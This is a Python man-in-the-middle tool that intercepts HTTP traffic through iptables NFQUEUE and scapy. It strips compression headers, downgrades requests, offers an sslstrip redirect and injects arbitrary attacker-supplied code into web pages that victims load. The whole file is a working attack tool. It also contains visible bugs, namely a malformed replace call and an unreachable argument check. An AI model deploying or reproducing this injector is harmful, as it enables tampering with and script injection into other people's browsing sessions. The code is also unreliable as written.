#!/usr/bin/env python3

import re

import subprocess
import netfilterqueue
import scapy.all as scapy
import argparse
import os
import sys


def is_not_root():
    return os.geteuid() != 0


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-d",
        "--destination",
        dest="destination",
        help="Destination (sslstrip, forward, local)",
    )
    parser.add_argument(
        "-c",
        "--code",
        dest="code",
        help="Code to inject",
    )
    values = parser.parse_args()
    if not values.destination:
        parser.error(
            "[-] Please specify a destination (sslstrip, forward, local), use --help for more information"
        )
        if not values.code:
            parser.error("[-] Give code to inject, use --help for more information")
    return values


def apache_start():
    print("[+] Starting apache2 service...")
    try:
        subprocess.check_output(["service", "apache2", "start"])
    except subprocess.CalledProcessError:
        print("[+] Installing and starting apache2 service...")
        subprocess.call("apt-get install apache2 -y", shell=True)
        subprocess.call("service apache2 start", shell=True)
    print("[+] Apache2 started.")


def run_queue(destination, qnum):
    if destination == "forward":
        subprocess.call(
            "iptables -I FORWARD -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
    elif destination == "sslstrip":
        subprocess.call(
            "iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
        subprocess.call(
            "iptables -I INPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
        subprocess.call(
            "sudo iptables -t nat -A PREROUTING -p tcp"
            " --destination-port 80 -j REDIRECT --to-port 10000",
            shell=True,
        )
    elif destination == "local":
        subprocess.call(
            "iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
        subprocess.call(
            "iptables -I INPUT -j NFQUEUE --queue-num {}".format(qnum),
            shell=True,
        )
    else:
        print("[-] Unknown destination")

    # Create netfilterqueue instance
    queue = netfilterqueue.NetfilterQueue()
    # Bind queue number 0 (queue zero in iptables)
    queue.bind(qnum, process_packet)
    # Run the queue
    queue.run()


def restore():
    subprocess.call("iptables --flush", shell=True)
    subprocess.call("service apache2 stop", shell=True)
    print("[+] Quitting.")


def forge_packet(packet, load):
    packet[scapy.Raw].load = load
    # Packet corruption can be detected using the checksum and
    # len fields. By deleting these scapy generates new entries.
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        load = scapy_packet[scapy.Raw].load

        if (
            scapy_packet[scapy.TCP].dport == 80
            or scapy_packet[scapy.TCP].dport == 10000
        ):
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif (
            scapy_packet[scapy.TCP].sport == 80
            or scapy_packet[scapy.TCP].sport == 10000
        ):
            print("[+] Response")
            print("[+] Injection")
            load = load.replace("</body>" + options.code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)

            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(options.code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = forge_packet(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


# Check whether we're root
if is_not_root():
    sys.exit("[-] This script requires superuser privileges.")
options = get_args()
try:
    apache_start()
    run_queue(options.destination, 0)
except KeyboardInterrupt:
    print("[+] \nDetected CTRL+C ... Restoring normal connections ...")
    restore()
